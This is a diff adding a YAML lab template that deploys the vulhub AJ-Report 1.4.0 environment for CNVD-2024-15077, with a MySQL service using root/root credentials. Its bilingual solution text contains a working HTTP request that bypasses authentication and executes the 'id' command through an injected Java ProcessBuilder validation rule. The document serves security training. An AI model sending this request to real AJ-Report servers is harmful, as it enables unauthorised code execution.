@@ -1,0 +1,130 @@
+apiVersion: hivora/v1
+kind: Template
+metadata:
+  slug: vulhub-aj-report-cnvd-2024-15077
+  name: AJ-Report Authentication Bypass and Remote Code Execution
+  version: 1.0.0
+  category: security-lab
+  tags:
+  - vulhub
+  - aj-report
+  description: AJ-Report — AJ-Report Authentication Bypass and Remote Code Execution (vulhub).
+  links:
+    site: https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
+  maintainer: vulhub
+  license: MIT (vulhub)
+  source: https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
+  lab:
+    phase: exploitation
+    cves: []
+    os:
+    - linux
+    tech:
+    - aj-report
+    - auth-bypass
+    - rce
+    difficulty: medium
+    summary: AJ-Report Authentication Bypass and Remote Code Execution
+    solution:
+      fr: |
+        Adresse : IP:port affichés par le panel (les ports du guide sont ceux d'origine de vulhub), ou l'IP du lab sur le port d'origine via le VPN labo. Guide d'origine (anglais) : https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
+        AJ-Report is an open source BI platform. In the version 1.4.0 and before, there is a authentication bypass issue and the attacker is able to perform arbitrary code execution through the issue.
+        References:
+        - <https://xz.aliyun.com/t/14460>
+        - <https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md>
+        # Vulnerable environment
+        Execute following command to start a AJ-Report server 1.4.0:
+        $ docker compose up -d
+        After the server is started, you can see the login page of AJ-Report through `http://your-ip:9095`.
+        # Exploit
+        To exploit the issue by following request:
+        $ POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+        $ Host: your-ip:9095
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        $ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        $ Accept-Encoding: gzip, deflate, br
+        $ Accept-Language: zh-CN,zh;q=0.9
+        $ Content-Type: application/json;charset=UTF-8
+        $ Connection: close
+        $ Content-Length: 339
+        $ {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+        As you can see, `id` command is executed successfully:
+      en: |
+        Address: the IP:port shown by the panel (the guide's ports are vulhub's original ones), or the lab's IP on the original port through the labs VPN. Original guide: https://github.com/vulhub/vulhub/tree/master/aj-report/CNVD-2024-15077
+        AJ-Report is an open source BI platform. In the version 1.4.0 and before, there is a authentication bypass issue and the attacker is able to perform arbitrary code execution through the issue.
+        References:
+        - <https://xz.aliyun.com/t/14460>
+        - <https://github.com/wy876/POC/blob/main/AJ-Report%E5%BC%80%E6%BA%90%E6%95%B0%E6%8D%AE%E5%A4%A7%E5%B1%8F%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md>
+        # Vulnerable environment
+        Execute following command to start a AJ-Report server 1.4.0:
+        $ docker compose up -d
+        After the server is started, you can see the login page of AJ-Report through `http://your-ip:9095`.
+        # Exploit
+        To exploit the issue by following request:
+        $ POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
+        $ Host: your-ip:9095
+        $ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        $ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        $ Accept-Encoding: gzip, deflate, br
+        $ Accept-Language: zh-CN,zh;q=0.9
+        $ Content-Type: application/json;charset=UTF-8
+        $ Connection: close
+        $ Content-Length: 339
+        $ {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}
+        As you can see, `id` command is executed successfully:
+requirements:
+  arch:
+  - amd64
+form:
+  basic:
+  - id: port_9095
+    group:
+      fr: Accès
+      en: Access
+    label: web 9095/tcp
+    type: port
+    default: 9095
+  - id: port_5005
+    group:
+      fr: Accès
+      en: Access
+    label: web 5005/tcp
+    type: port
+    default: 5005
+services:
+  web:
+    role: main
+    image: vulhub/aj-report
+    tag: 1.4.0@sha256:586f2ae961586f7d5f608707a060b5c6f8ba6d9e98c095242196b0750e6d982c
+    frozen: true
+    env:
+      MYSQL_HOST: db
+      MYSQL_PORT: '3306'
+      MYSQL_DB: aj_report
+      MYSQL_USERNAME: root
+      MYSQL_PASSWORD: root
+    depends_on:
+    - db
+    ports:
+    - container: 9095
+      host: '{{ form.port_9095 }}'
+      protocol: tcp
+      purpose: web
+      exposure: lan
+    - container: 5005
+      host: '{{ form.port_5005 }}'
+      protocol: tcp
+      purpose: other
+      exposure: lan
+  db:
+    role: database
+    image: mysql
+    tag: 5.7@sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
+    frozen: true
+    env:
+      MYSQL_ROOT_PASSWORD: root
+      MYSQL_DATABASE: aj_report
+update:
+  strategy: manual
+access:
+  web: http://{{ host.lan_ip }}:{{ form.port_9095 }}
